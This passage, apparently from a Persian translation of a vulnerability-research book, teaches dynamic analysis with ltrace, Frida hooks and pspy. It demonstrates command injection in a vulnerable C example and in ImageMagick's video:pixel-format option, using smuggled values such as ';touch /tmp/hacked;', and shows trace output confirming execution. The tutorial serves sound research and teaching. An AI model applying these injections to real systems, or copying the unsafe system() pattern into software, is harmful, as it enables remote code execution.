    return result;
}
```

*فهرست ۵-۳: مثال آموزشی یک برنامه آسیب‌پذیر نوشته‌شده به C*

این برنامه با کدنویسی خطرناک، ورودی کاربر را می‌گیرد و به فراخوانی کتابخانه system پاس می‌دهد. در استفاده معمول، همان‌طور که انتظار می‌رود کار می‌کند:

```bash
$ gcc -o hello-vuln hello-vuln.c
$ ./hello-vuln
Enter your name: Raccoon
Hello, Raccoon
```

با این حال، به دلیل آسیب‌پذیری تزریق دستور، مهاجم می‌تواند برای اجرای دستورات دلخواه شل از آن بهره‌برداری کند:

```text
$ ./hello-vuln
Enter your name: ;whoami;
Hello,
kali
```

چگونه با تحلیل داینامیک این آسیب‌پذیری را تشخیص دهید؟ ابزار ltrace راه عالی برای بررسی این‌که آیا ورودی‌های تأمین‌شده توسط کاربر به فراخوانی‌های کتابخانه‌ای پاس داده می‌شوند یا خیر است. ltrace را روی hello-vuln با یک مقدار ورودی قناری (Canary) اجرا کنید و سپس خروجی را برای وقوع‌های آن مقدار بررسی کنید:

```diff
$ ltrace ./hello-vuln >/dev/null
printf("Enter your name: ") = 17
canary123
__isoc99_scanf(0x55663b7f3016, 0x7fff69c19ad0, 0, 0) = 1
snprintf("echo Hello, canary123", 100, "echo Hello, %s", "canary123") = 21
❶ system("echo Hello, canary123" <no return ...>
--- SIGCHLD (Child exited) ---
<... system resumed> ) = 0
+++ exited (status 0) +++
```

این، فراخوانی‌های snprintf و system را — شامل آرگومان‌ها و مقادیر بازگشتی واقعی‌شان — ردیابی می‌کند. اگر این یک برنامه واقعی بود، فوراً روی فراخوانی system‌ای که از مقدار قناری شما استفاده می‌کند ❶ زوم می‌کردید.

سپس کار فقط این است که با تغییر ورودی و بررسی آرگومان حاصل در ltrace، آزمایش کنید که آیا تزریق دستور ممکن است یا خیر. این، ورودی نهاییِ پاس‌داده‌شده به چاهک خطرناکی که تحلیل می‌کنید را آشکار می‌سازد. اگر در طول مسیر، هرگونه پاک‌سازی (Sanitization)، الحاق (Concatenation) یا دستکاری ورودیِ تحت‌کنترل-مهاجم انجام شده باشد، در لاگ‌های ltrace بازتاب می‌یابد. این به شما امکان می‌دهد دورزدن‌ها (Bypass) و ترکیب‌های مختلف را به‌صورت داینامیک تست کنید.

علاوه بر فراخوانی‌های تابع کتابخانه، ltrace می‌تواند فراخوانی‌های سیستمی را هم ردیابی کند. فراخوانی‌های سیستمی از فراخوانی‌های کتابخانه‌ای متفاوت‌اند، زیرا به خدمات هسته‌ای سیستم‌عامل مربوط می‌شوند؛ مانند ورودی/خروجی فایل و ایجاد پروسه. این‌ها در کرنل (Kernel) اجرا می‌شوند، در حالی که توابع کتابخانه‌ای درون فضای کاربر (User Space) برنامه عمل می‌کنند. البته توابع کتابخانه‌ای هم می‌توانند فراخوانی‌های سیستمی انجام دهند.

می‌توانید فراخوانی‌های سیستمیِ برنامه را با گزینه -S برای ltrace ردیابی کنید. از آنجا که خروجی بسیار بیشتر خواهد بود، بهتر است آن را در یک فایل ذخیره کنید تا چاپ روی stdout. همچنین از گزینه -f برای ردیابی پروسه‌های فرزند — مانند آنچه توسط فراخوانی system ساخته می‌شود — استفاده کنید:

```text
$ ltrace -o ltrace.txt -f -S ./hello-vuln >/dev/null
canary
$ cat ltrace.txt
--snip--
❶ 2785318 printf("Enter your name: " <unfinished ...>
2785318 newfstatat@SYS(1, "", 0x7fffb0d03a40, 0x1000)
❷ 2785318 ioctl@SYS(1, 0x5401, 0x7fffb0d039a0, 4096)
2785318 getrandom@SYS(0x7f8c09700178, 8, 1, 4096)
2785318 brk@SYS(nil)
2785318 brk@SYS(0x56035aa78000)
❸ 2785318 <... printf resumed> )
2785318 newfstatat@SYS(0, "", 0x7fffb0d034d0, 0x1000)
2785318 read@SYS(0, "canary\n", 1024)
2785318 <... __isoc99_scanf resumed> )
2785318 snprintf("echo Hello, canary", 100, "echo Hello, %s", "canary")
❹ 2785318 system("echo Hello, canary" <unfinished ...>
--snip--
2785360 execve@SYS("/bin/sh", 0x7fffb0d03a70, 0x7fffb0d03fa8 <no return ...>
--snip--
2785318 <... system resumed> )
```

فراخوانی‌های سیستمی با پسوند @SYS (یا در نسخه‌های دیگر با پیشوند SYS_) مشخص می‌شوند. توجه کنید که چند فراخوانی تابع با <unfinished ...> همراه‌اند که نشان می‌دهد در انتظار تکمیل عملیات‌های دیگری (مانند فراخوانی‌های سیستمی) هستند. برای مثال، فراخوانی تابع printf ❶ باید چند فراخوانی سیستمی انجام دهد — مانند ioctl با فایل‌دیسکریپتور خروجی استاندارد یعنی ۱ به‌عنوان آرگومان اول ❷ — تا رشته را در خروجی استاندارد بنویسد و سپس تکمیل شود ❸.

درباره فراخوانی تابع system ❹ نیز همین‌طور است که طبق راهنمای لینوکس «طوری رفتار می‌کند که گویی با fork(2) یک پروسه فرزند ساخته که دستور شلِ مشخص‌شده در command را با execl(3) به این شکل اجرا کرده است»:

```text
execl("/bin/sh", "sh", "-c", command, (char *) NULL);
```

#### تحلیل فراخوانی‌های تابع کتابخانه در ImageMagick (Analyzing Library Function Calls in ImageMagick)

می‌توانید این تاکتیک ردیابی فراخوانی‌های کتابخانه را روی ImageMagick اعمال کنید. در تحلیل داینامیک، معمولاً توابع همیشگی برنامه را اجرا می‌کنید تا فراخوانی‌های مختلف تابع کتابخانه و فراخوانی‌های سیستمی را مشاهده کنید. برای برنامه‌های رابط خط فرمان، این شامل کار با گزینه‌ها و حالت‌های مختلف موجود است. برای مثال، ImageMagick از گزینه خط فرمان define پشتیبانی می‌کند که به کاربران اجازه می‌دهد عملیات پردازش تصویر مانند video:pixel-format را پیکربندی کنند.

نخست، یک فایل نمونه MOV برای اجرای ImageMagick دانلود کنید؛ مثلاً همان که در دستور wget زیر استفاده شده است. سپس در همان دایرکتوری که محتوای AppImage مربوط به ImageMagick را استخراج کرده‌اید، ltrace را روی باینری magick با یک مقدار قناری در آرگومان فرمت پیکسل اجرا کنید. گزینه -s 1024 را اضافه کنید تا حداکثر اندازه رشته قابل چاپ مشخص شود؛ مقدار پیش‌فرض این گزینه ۳۲ است که ممکن است باعث بریده شدن رشته‌های طولانی‌تر شود و شما مقادیر آرگومان مهم را از دست بدهید:

```bash
$ wget https://raw.githubusercontent.com/spaceraccoon/from-day-zero-to-zero-day/refs/heads/main/chapter-05/example.mov
$ ltrace -o ltrace.txt -f -S -s 1024 ./squashfs-root/usr/bin/magick identify -define video:pixel-format='canary123' example.mov
sh: 1: ffmpeg: not found
identify: UnableToOpenConfigureFile `delegates.xml' @ warning/configure.c/GetConfigureOptions/722.
```

این پیام خطا جالب است، زیرا نشان می‌دهد ImageMagick در تلاش برای اجرای ffmpeg — که در PATH وجود ندارد — است. در این نقطه، حس‌های شکارچی‌باگِ شما باید به احتمال تزریق دستور، به لرزش در بیاید. برای دیدن آنچه زیر سر می‌گذرد، ffmpeg یا مقدار قناری‌تان یعنی canary123 را در لاگ‌های ردیابی grep کنید:

```text
$ grep -E 'ffmpeg|canary123' ltrace.txt
2780743 strlen("'ffmpeg' -nostdin -loglevel error -i '/tmp/magick-NdheoaTWLtkBKDzS6DYe4cOueEjokeel' -an -f rawvideo -y -pix_fmt canary123 -vcodec webp '/tmp/magick-SQpXJBs9cwRKgJpskeuIx_L5711HIKUP'") = 182
2780743 memcpy(0x55b83e2767e8, "'ffmpeg' -nostdin -loglevel error -i '/tmp/magick-NdheoaTWLtkBKDzS6DYe4cOueEjokeel' -an -f rawvideo -y -pix_fmt canary123 -vcodec webp '/tmp/magick-SQpXJBs9cwRKgJpskeuIx_L5711HIKUP'\0", 183) = 0x55b83e2767e8
2780743 strlen("'ffmpeg' -nostdin -loglevel error -i '/tmp/magick-NdheoaTWLtkBKDzS6DYe4cOueEjokeel' -an -f rawvideo -y -pix_fmt canary123 -vcodec webp '/tmp/magick-SQpXJBs9cwRKgJpskeuIx_L5711HIKUP'") = 182
```

این بسیار امیدوارکننده به نظر می‌رسد. به نظر می‌رسد رشته‌ای از دستور شل وجود دارد که مقدار قناری شما را شامل می‌شود. با این حال، این فقط در بستر فراخوانی strlen یا memcpy ظاهر می‌شود، نه تابع اجرای دستوری مانند system.

با این وجود، اگر بالاتر در لاگ‌ها را بررسی کنید، این را می‌بینید:

```text
2782681 brk@SYS(nil)
2782681 mmap@SYS(nil, 8192, 3, 34, -1, 0)
--snip--
❶ 2782682 execve@SYS("/bin/sh", 0x7ffe2a7a4060, 0x7ffe2a7af208 <no return ...>
2782682 --- Called exec() ---
2782681 <... clone3 resumed> )
```

فراخوانی‌های اطراف execve ❶ شبیه الگوی فراخوانی‌ها در مثال hello-vuln است. با این حال، ltrace برای hello-vuln فراخوانی system را نیز ردیابی کرد. اگر نمادهای توابع رایج اجرای دستور شل را در هر دو باینری بررسی کنید، متوجه می‌شوید که باینری magick واقعاً آن نمادها را بارگذاری نمی‌کند:

```text
$ objdump -Tt ./hello-vuln | grep -E 'exec|system|popen'
0000000000000000  F *UND*  0000000000000000  system@GLIBC_2.2.5
0000000000000000  DF *UND*  0000000000000000  (GLIBC_2.2.5) system
$ objdump -Tt ./squashfs-root/usr/bin/magick | grep -E 'exec|system|popen'
```

این به آن دلیل است که ImageMagick واقعاً این توابع را مستقیماً ایمپورت نمی‌کند. در عوض، آن‌ها از libc.so.6 توسط کتابخانه libMagickCore-7.Q16HDRI.so.10.0.1 — واقع در squashfs-root/usr/lib — ایمپورت شده‌اند که خودش چندین تابع Wrapper را Export می‌کند که ImageMagick از آن‌ها استفاده می‌کند:

```text
$ objdump -Tt ./squashfs-root/usr/lib/libMagickCore-7.Q16HDRI.so.10.0.1 | grep -E 'exec|system|popen'
0000000000000000  DF *UND*  0000000000000000  (GLIBC_2.2.5) popen
0000000000000000  DF *UND*  0000000000000000  (GLIBC_2.2.5) execvp
0000000000000000  DF *UND*  0000000000000000  (GLIBC_2.2.5) system
```

برای ردیابی صحیح این توابع کتابخانه‌ای، باید از گزینه‌های فیلتر ltrace استفاده کنید تا تعداد فراخوانی‌های ثبت‌شده گسترش یابد. طبق صفحه راهنما می‌توانید از گزینه‌های زیر استفاده کنید:

- **-x** نشان بده چه فراخوانی‌هایی به این نمادها می‌شود (شامل فراخوانی‌های محلی)
- **-e** نشان بده چه فراخوانی‌هایی به این نمادها می‌شود (فقط فراخوانی‌های بین‌کتابخانه‌ای)
- **-l** نشان بده چه فراخوانی‌هایی به این کتابخانه وارد می‌شود

از گزینه -x برای ردیابی فراخوانی‌های popen استفاده کنید:

```text
$ ltrace -x 'popen' -o ltrace.txt -f -S -s 1024 ./squashfs-root/usr/bin/magick identify -define video:pixel-format='canary123' example.mov
sh: 1: ffmpeg: not found
identify: UnableToOpenConfigureFile `delegates.xml' @ warning/configure.c/GetConfigureOptions/722.
$ grep ffmpeg ltrace.txt
2787837 popen@libc.so.6("'ffmpeg' -nostdin -loglevel error -i '/tmp/magick-4v08z3RT252MF305Ftxn2EFudPmQuy9' -an -f rawvideo -y -pix_fmt canary123 -vcodec webp '/tmp/magick-KKDEsZhEeOqrhRYx_HDg5i2k-QEGQExO'", "r" <unfinished ...>
```

این اهمیتِ ثبت هم‌زمان فراخوانی‌های سیستمی و کتابخانه‌ای و ردیابی پروسه‌های فرزند را برجسته می‌کند. بسته به فیلترهای شما، گاهی ممکن است فراخوانی‌های کتابخانه‌ای ثبت نشوند، اما فراخوانی‌های سیستمیِ سطح‌پایین‌تر به‌ندرت حذف می‌شوند. با این حال، برای یک برنامه با کد منبع بسته، نمی‌دانید چه فیلترهایی مشخص کنید مگر اینکه تحلیل ایستای عمیق‌تری انجام دهید.

با توجه به اینکه فراخوانی سیستمی execve از پاس دادن رشته دستور شلِ شامل ffmpeg به‌عنوان آرگومان به popen نتیجه شد، ممکن است مهاجم بتواند مقدار قناری را دستکاری کند تا از آسیب‌پذیری تزریق دستور بهره‌برداری کند.

در این نقطه شاید از خود بپرسید که اصلاً پیدا کردن آسیب‌پذیری تزریق دستور در یک برنامه خط فرمان محلی مثل ImageMagick چه فایده‌ای دارد. برنامه‌های وب اغلب از ImageMagick برای پردازش تصاویر استفاده می‌کنند، پس این آسیب‌پذیری در برخی بسترها می‌تواند از راه دور قابل بهره‌برداری باشد. برای مثال، اگر یک وب‌اپلیکیشن قابلیت‌های ویرایش تصویری را عرضه کند که به کاربران اجازه دهد گزینه‌های مختلفی را کنترل کنند که مستقیماً به ImageMagick پاس داده می‌شوند، مهاجم می‌تواند از آسیب‌پذیری تزریق دستور برای رسیدن به اجرای کد راه‌دور (Remote Code Execution) بهره‌برداری کند.


یک روش بالقوه برای بهره‌برداری از آسیب‌پذیری تزریق دستور، استفاده از جداکننده دستور شل یعنی سمی‌کالن (;) برای خارج شدن از دستور ffmpeg است؛ مثلاً با تنظیم گزینه video:pixel-format روی ;touch /tmp/hacked;.

این اثبات مفهوم (Proof of Concept) را اجرا کنید. همچنین باید بتوانید با بررسی لاگ‌های حاصل، تأیید کنید که دستور اجرا شده است:

```bash
$ ls /tmp/hacked
ls: cannot access '/tmp/hacked': No such file or directory
$ ltrace -o ltrace.txt -f -S -s 1024 ./squashfs-root/usr/bin/magick identify -define video:pixel-format=';touch /tmp/hacked;' example.mov
sh: 1: ffmpeg: not found
sh: 1: -vcodec: not found
identify: UnableToOpenConfigureFile `delegates.xml' @ warning/configure.c/GetConfigureOptions/722.
$ ls /tmp/hacked
/tmp/hacked
$ grep '/tmp/hacked' ltrace.txt
2788520 strlen("'ffmpeg' -nostdin -loglevel error -i '/tmp/magick-a8sDn71godWBu8nqXCyk6oc5Cpg3yuEx' -an -f rawvideo -y -pix_fmt ;touch /tmp/hacked; -vcodec ❶ webp '/tmp/magick-Cu8aLs5H9WT4KRUPPWUuAreHG36iXd93'")
2788520 memcpy(0x5646d9b497e8, "'ffmpeg' -nostdin -loglevel error -i '/tmp/magick-a8sDn71godWBu8nqXCyk6oc5Cpg3yuEx' -an -f rawvideo -y -pix_fmt ;touch /tmp/hacked; -vcodec webp '/tmp/magick-Cu8aLs5H9WT4KRUPPWUuAreHG36iXd93'\0", 193)
2788520 strlen("'ffmpeg' -nostdin -loglevel error -i '/tmp/magick-a8sDn71godWBu8nqXCyk6oc5Cpg3yuEx' -an -f rawvideo -y -pix_fmt ;touch /tmp/hacked; -vcodec webp '/tmp/magick-Cu8aLs5H9WT4KRUPPWUuAreHG36iXd93'")
2788520 strcspn("/tmp/hacked", "\210\203\201\202\204\206\207")
2788521 open("/tmp/hacked", 2369, 0666 <unfinished ...> ❷
2788521 openat@SYS(AT_FDCWD, "/tmp/hacked", 0x941, 0666)
```

مطابق انتظار، دستوری که در حال اجرا بود دستکاری شده تا جداکننده دستور شل یعنی سمی‌کالن ❶ را شامل شود که سرانجام به ساخت /tmp/hacked می‌انجامد — همان‌طور که فراخوانی سیستمی open ❷ نشان می‌دهد. مأموریت انجام شد!

اگرچه بدون شک می‌توانید صرفاً با مشاهده فراخوانی‌های تابع کتابخانه و فراخوانی سیستمی برای مقادیر قناریِ پاس‌داده‌شده به برنامه از طریق منابع ورودی مختلف، میوه‌های در دسترس زیادی پیدا کنید، ltrace محدودیت‌های جدی دارد چون صرفاً فراخوانی‌های کتابخانه و سیستم را رهگیری و خروجی می‌دهد. برای هوک (Hook) کردن و دستکاری فراخوانی‌های خاص روی-به-طول (On-the-Fly)، باید به ابزار دیگری روی بیاورید.

#### ابزارسازی توابع با Frida (Instrumenting Functions with Frida)

Frida یک کیت ابزارسازی داینامیک کد (Dynamic Code Instrumentation) است که به کاربران اجازه می‌دهد کد جاوااسکریپت را در برنامه‌های نیتیو روی چندین پلتفرم تزریق کنند. این یعنی کاربر می‌تواند سپس با یک API جاوااسکریپتی راحت، مقادیر موجود در حافظه را بخواند یا دستکاری کند. اگرچه دیباگرهای سنتی تا حدی از اسکریپت‌نویسی پشتیبانی می‌کنند، اسکریپت‌ها در Frida شهروند درجه یک‌اند و تکرار سریع تست‌های تحلیل داینامیک را ممکن می‌سازند.

Frida را نصب و روی مثال hello-vulnِ قبلی اجرا کنید. به‌جای نوشتن مستقیم اسکریپت‌های ابزارسازی، می‌توانید از frida-trace استفاده کنید تا به‌طور خودکار اسکریپت‌هایی برای هوک کردن توابع تولید کند. به‌طور پیش‌فرض، این اسکریپت‌ها صرفاً فراخوانی‌ها و آرگومان‌های تابع را چاپ می‌کنند:

```bash
$ sudo pip install frida-tools
$ frida-trace -i "system" ./hello-vuln ❶
Instrumenting...
system: Auto-generated handler at "/home/kali/Desktop/hello-vuln/__handlers__/libc.so.6/system.js" ❷
Enter your name: Started tracing 1 function. Press Ctrl+C to stop.
canary123
Hello, canary123
/* TID 0xd8e1a */
4138  system(command="echo Hello, canary123") ❸
Process terminated
```

وقتی مشخص می‌کنید که می‌خواهید فراخوانی‌های system ❶ را ردیابی کنید، frida-trace به‌طور خودکار یک هندلر جاوااسکریپت برای تابع system ❷ حل و تولید می‌کند که به پروسه تزریق شده است. این هندلر زمانی اجرا شد که hello-vuln تابع system را فراخوانی کرد و Frida آن را رهگیری کرد ❸.

برای فهم اینکه این هندلر چه می‌کند، نگاه دقیق‌تری به فایل جاوااسکریپت تولیدشده بیندازید:

```javascript
/*
 * Auto-generated by Frida. Please modify to match the signature of system.
 * This stub is currently auto-generated from manpages when available.
 *
 * For full API reference, see: https://frida.re/docs/javascript-api/
 */
{
    onEnter(log, args, state) {
        log(`system(command="${args[0].readUtf8String()}")`);
    },
    onLeave(log, retval, state) {
    }
}
```

اسکریپت، هندلر onEnter را پیش از اجرای تابع رهگیری‌شده فراخوانی می‌کند و صرفاً آرگومان اول را لاگ می‌کند. در همین حین، هندلر onLeave هنوز خالی است. عبارت log(\`system returned ${retval}\`); را درون بدنه تابع قرار دهید و سپس frida-trace را دوباره اجرا کنید. مطابق انتظار، مقدار بازگشتی system را بر اساس ورودی‌های شما به‌درستی لاگ می‌کند:

```bash
$ frida-trace -i "system" ./hello-vuln
Instrumenting...
system: Loaded handler at "/home/kali/Desktop/hello-vuln/__handlers__/libc.so.6/system.js"
Enter your name: Started tracing 1 function. Press Ctrl+C to stop.
canary123
Hello, canary123
/* TID 0xec246 */
6455  system(command="echo Hello, canary123")
6458  system returned 0x0
$ frida-trace -i "system" ./hello-vuln
Instrumenting...
system: Loaded handler at "/home/kali/Desktop/hello-vuln/__handlers__/libc.so.6/system.js"
Enter your name: Started tracing 1 function. Press Ctrl+C to stop.
;error
sh: 1: error: not found
/* TID 0xec563 */
11949  system(command="echo Hello, ;error")
11951  system returned 0x7f00
```

در این نقطه به نظر نمی‌رسد کاری فراتر از ltrace انجام می‌دهد. با این حال، ویژگی کشنده Frida، ابزارسازی داینامیک است که به شما اجازه می‌دهد حافظه را در زمان اجرا دستکاری کنید. برای مثال، می‌توانید آرگومان‌های فراخوانی تابع system را دستکاری کنید؛ همان‌طور که در فهرست ۵-۴ نشان داده شده است.

```javascript
{
    onEnter(log, args, state) {
        log(`system(command="${args[0].readUtf8String()}")`);
❶        args[0].writeUtf8String('modified argument!');
        log(`system(command="${args[0].readUtf8String()}")`);
    },
    onLeave(log, retval, state) {
        log(`system returned ${retval}`);
    }
}
```

*فهرست ۵-۴: اسکریپت هوکِ اصلاح‌شده*

می‌بینید که باید از API جاوااسکریپت Frida برای نوشتن در حافظه برنامه ❶ استفاده کنید، به‌جای نسبت دادن مستقیم یک مقدار رشته‌ای، زیرا انواع داده متفاوت‌اند — در اینجا یک اشاره‌گر (Pointer):

```text
$ frida-trace -i "system" ./hello-vuln
Instrumenting...
system: Loaded handler at "/home/kali/Desktop/hello-vuln/__handlers__/libc.so.6/system.js"
Enter your name: Started tracing 1 function. Press Ctrl+C to stop.
asd
sh: 1: modified: not found
/* TID 0x13e92 */
679   system(command="echo Hello, asd") ❶
679   system(command="modified argument!") ❷
680   system returned 0x7f00
```

وقتی اسکریپت اصلاح‌شده را اجرا می‌کنید، حتی اگر ورودی استاندارد به‌درستی به فراخوانی system ❶ پاس داده شود، به‌جای آن دستور اصلاح‌شده شما ❷ اجرا می‌شود. می‌توانید از این قابلیت برای انجام کارهای مفید در مهندسی معکوس استفاده کنید. برای مثال، می‌توانید با دستکاری مقدار بازگشتی، توابع اعتبارسنجی را دور بزنید تا به قابلیت‌های عمیق‌تر برنامه دسترسی پیدا کنید. در تحلیل برنامه‌های موبایل، یک مورد استفاده رایج، دور زدن Certificate Pinning یا تشخیص روت (Root Detection) است.

برای استفاده مؤثرتر از Frida، باید از frida-trace فراتر روید و شروع به نوشتن اسکریپت‌های پیچیده‌تر با اتصال‌های API (Bindings) Frida کنید. برای مثال، می‌توانید از اسکریپت پایتون فهرست ۵-۵ برای رهگیری فراخوانی‌های popen استفاده کنید.

```python
hook.py
import threading
from frida_tools.application import Reactor
import frida
import sys

SCRIPT = """
Interceptor.attach(Module.getExportByName(null, 'popen'), {
    onEnter: function (args) {
        send({
            function: 'popen',
            command: Memory.readUtf8String(args[0]),
        });
    }
});
"""

class Application:
    def __init__(self, argv, script):
        self._argv = argv
        self._script = script
        self._stop_requested = threading.Event()
        self._reactor = Reactor(
            run_until_return=lambda reactor: self._stop_requested.wait()
        )

    def run(self):
        self._reactor.schedule(lambda: self._start())
        self._reactor.run()

    def _start(self):
❶        pid = frida.spawn(self._argv)
❷        session = frida.attach(pid)
        session.on(
            "detached",
            lambda reason: self._reactor.schedule(
                lambda: self._on_detached(pid, session, reason)
            )
        )
❸        script = session.create_script(self._script)
        script.on("message", self._on_message)
        script.load()
        frida.resume(pid)

    def _on_message(self, message, data):
        print(message)

    def _stop_if_idle(self):
        self._stop_requested.set()

    def _on_detached(self, pid, session, reason):
        self._reactor.schedule(self._stop_if_idle, delay=0.5)

if __name__ == '__main__':
    if len(sys.argv) < 2:
        print("Usage: python hook.py <command>")
        exit(1)
    app = Application(sys.argv[1:], SCRIPT)
    app.run()
```

*فهرست ۵-۵: اسکریپت هوک برای رهگیری popen*

این اسکریپت از کتابخانه پایتونی Frida استفاده می‌کند تا برنامه هدف را Spawn کند ❶، Frida را به آن متصل (Attach) کند ❷ و در نهایت اسکریپت هوک جاوااسکریپت را تزریق کند ❸. اگرچه می‌توانید اسکریپت جاوااسکریپت را مستقیماً با Frida روی خط فرمان اجرا کنید، این رویکرد برنامه‌نویسی‌تر و بازاستفاده‌پذیرتر است.

می‌توانید اسکریپت را با کد زیر روی ImageMagick تست کنید:

```text
$ python hook.py ./magick identify -define video:pixel-format='canary' example.mov
{'type': 'send', 'payload': {'function': 'popen', 'command': "'ffmpeg' -nostdin -loglevel error -i '/tmp/magick-tpq_LLF5K9ppQWPyQrtdqXJTjBrgdrRY' -an -f rawvideo -y -pix_fmt canary -vcodec webp '/tmp/magick-pUw1gC4Rwp-8I07w6JbbAJiFkLvD7tv9'"}}
sh: 1: ffmpeg: not found
identify: UnableToOpenConfigureFile `delegates.xml' @ warning/configure.c/GetConfigureOptions/722.
```

این روش بسیار ساده‌تر و تمیزتر برای ردیابی فراخوانی‌های تابع است. با همین اسکلت می‌توانید اسکریپت را به ابزاری تمام‌عیار گسترش دهید که به‌طور خودکار فهرستی از توابع مورد نظر را هوک کند، پروسه‌های فرزند را ردیابی کند و بیشتر. هرچه با برنامه‌ها و محیط‌های پیچیده‌تری روبه‌رو شوید، این خودکارسازی برای بهینه کردن تلاش‌های تحلیلی‌تان ارزشمند خواهد بود.

همچنین می‌توانید از CLI حلقه خواندن-ارزیابی-چاپ (REPL) در Frida برای بازرسی و رهگیری برنامه روی-به-طول استفاده کنید؛ مشابه یک دیباگر سنتی اما با موتور اسکریپت‌نویسی بسیار قدرتمندتر. مقداری وقت صرف مطالعه مستندات Frida در https://frida.re/docs کنید و بررسی نمایید چگونه می‌توانید قابلیت‌های Frida را در یک گردش کار تحلیل داینامیک به کار بگیرید.

#### پایش رویدادهای سطح‌بالاتر (Monitoring Higher-Level Events)

گاهی ردیابی فراخوانی‌های تابع یا فراخوانی‌های سیستمی ممکن است بیش از حد ریزباشد. یک برنامه می‌تواند در چند ثانیه هزاران چنین فراخوانی‌ای انجام دهد و اعمال فیلترهای محدودکننده بیش از حد ممکن است باعث شود اطلاعات مهمی را از دست بدهید. در چنین مواردی، لایه سطح‌بالاتری از تحلیل داینامیک وجود دارد که می‌توانید روی برنامه اعمال کنید: مشاهده رویدادهایی که برنامه به‌عنوان بخشی از عملکرد عادی خودش تولید می‌کند.

برخی انواع رویدادهایی که ممکن است بخواهید پایش کنید عبارت‌اند از:

- **رویدادهای شبکه (Network Events):** ترافیک شبکه‌ای که ممکن است یک برنامه تولید کند.
- **رویدادهای سیستمی (System Events):** رویدادهای مرتبط با ورودی/خروجی فایل، ایجاد پروسه، اتصالات شبکه و غیره. این با ردیابی فراخوانی سیستمی همپوشانی دارد اما می‌تواند رویدادهای سطح سیستم‌عامل را هم شامل شود. نمونه‌ها شامل Process Monitor (Procmon) و pspy هستند.
- **لاگ‌ها (Logging):** پیام‌های دیباگ و خطا از پروسه‌های مختلف. نمونه‌ها شامل Event Viewer (ویندوز)، journalctl (لینوکس)، Logcat (اندروید) و لاگ‌های مخصوص برنامه هستند.

یک برنامه ذخیره‌سازی ابری مانند Dropbox یا OneDrive را در نظر بگیرید که از طریق پروتکل‌های مختلف درخواست‌های شبکه‌ای می‌فرستد. به‌جای پایش فراخوانی‌های لازم برای باز کردن سوکت‌های شبکه، ارسال بسته‌ها و غیره، می‌توانید از یک ابزار مانیتورینگ شبکه مانند Wireshark استفاده کنید تا بسته‌هایی را که هنگام استفاده از برنامه ارسال می‌شوند، ضبط کنید. این به شما امکان می‌دهد نتایج نهایی را ببینید به‌جای اینکه به‌طور طاقت‌فرسا آن‌ها را از طریق تحلیل ایستا و داینامیک سطح‌پایین بازسازی کنید.

یک شباهت میان این ابزارها این است که معمولاً بر مشاهده «اثرات جانبی» (Side Effect) تولیدشده توسط برنامه‌ها متکی‌اند، نه رهگیری مستقیم رویدادها. برای مثال، pspy فایل‌سیستم مجازی procfs را در لینوکس مانیتور می‌کند که شامل اطلاعات کلیدی درباره پروسه‌هاست؛ مانند رشته‌های خط فرمانشان، دایرکتوری‌های کاری فعلی و متغیرهای محیطی.

آخرین نسخه pspy را از https://github.com/DominicBreuker/pspy/releases دانلود کنید. در یک پنجره ترمینال جداگانه، pspy را اجرا و چند ثانیه صبر کنید تا مقداردهی اولیه شود. سپس دستور قناری را برای ImageMagick دوباره اجرا کنید. خروجی pspy را با دقت بررسی کنید و باید خطوط مربوط به دستور اجرا‌شده را بیابید (ممکن است لازم باشد دستور ImageMagick را چند بار اجرا کنید تا به‌درستی ثبت شود):

```text
2023/07/09 12:38:35 CMD: UID=1000  PID=1118155   | ./squashfs-root/usr/bin/magick identify -define video:pixel-format=canary123 example.mov
2023/07/09 12:38:35 CMD: UID=1000  PID=1118156   | sh -c 'ffmpeg' -nostdin ❶ -loglevel error -i '/tmp/magick-OToPOMUXkqamDmbLx8ovMEZzfV5TTbJy' -an -f rawvideo -y -pix_fmt canary123 -vcodec webp '/tmp/magick-gd_VQDFJdEQIaGeUs2Dw2fKYVBfLnH3M'
```

ابزار pspy دستور شل اجرا‌شده توسط ImageMagick ❶ را بدون نیاز به ابزارسازی مستقیم باینری، به‌دقت ثبت می‌کند. این به شما امکان می‌دهد رویکردی کم‌دخالت‌تر اتخاذ کنید و با ظرافت از بسیاری از مشکلات معمول دیباگ و فیلترینگ — که با ردیابی سطح‌پایین‌ترِ فراخوانی‌های سیستمی و کتابخانه‌ای تجربه می‌کنید — اجتناب کنید.

یک نقطه ضعف این است که بخش زیادی از جزئیات داده‌ها را نیز از دست می‌دهید. برای مثال، ممکن است نتوانید مستقیماً یک پروسه را به‌عنوان فرزند پروسه دیگری نسبت دهید. پس باید به سرنخ‌های بافتی مانند زمان ایجاد پروسه و شناسه پروسه (PID) اتکا کنید. علاوه بر این، همه داده‌های قابل مشاهده از این منابع قابل استفاده نیستند. برای مثال، رهگیری ترافیک شبکه اگر رمزنگاری شده باشد بینش زیادی نمی‌دهد، اگرچه برخی ابزارها به شما اجازه می‌دهند ترافیک HTTPS را با افزودن گواهی Certificate Authority (CA) خودشان به مخزن اطمینان سیستم یا مرورگرتان رمزگشایی کنید. برخی لاگ‌های مخصوص برنامه نیز ممکن است رمزنگاری شده یا در قالب اختصاصی‌ای ذخیره شوند که به تحلیل اضافی نیاز دارد.

### ارزیابی بهره‌برداری‌پذیری (Evaluating Exploitability)

پس از شناسایی منبع‌ها و چاهک‌های بالقوه در برنامه، باید تأیید کنید که آیا یک مسیر منبع-به-چاهکِ عملی — یا قابل بهره‌برداری — وجود دارد یا خیر. همان‌طور که در فصل ۱ آموختید، ممکن است پاک‌سازها (Sanitizer) یا کدهای اعتبارسنجی در کار باشند که مانع رسیدن هر Payloadی به چاهک می‌شوند. با این حال، برخلاف کد منبع، به دلیل اطلاعات ناقص، فهرست کردن تک‌تک گام‌های طی‌شده توسط ورودی‌های تحت‌کنترل-مهاجم در یک باینری می‌تواند دشوار باشد.

مثل تماشای پرندگان در جنگلی انبوه است. اگر شانس بیاورید، گاهی نگاهی شفاف به هدف‌تان خواهید داشت وقتی که در حرکتش است، اما اغلب پوشیده از پوشش گیاهی است. می‌توانید جهت کلی حرکت را تشخیص دهید و با درجه‌ای از قطعیت پیش‌بینی کنید کجا ظاهر خواهد شد، اما هرگز بی‌خطا نیست. باید به سرنخ‌های بیرونی درباره اینکه پرنده در هر لحظه کجا ممکن است باشد اتکا کنید؛ مثل بال‌زدن یا خش‌خش برگ‌ها. به همین ترتیب، برخی سیگنال‌ها وجود دارد که می‌توانید به آن‌ها توجه کنید تا مشخص شود داده‌های منبع در کجای برنامه به سر می‌رسند.

#### تحلیل خطاها (Analyzing Errors)

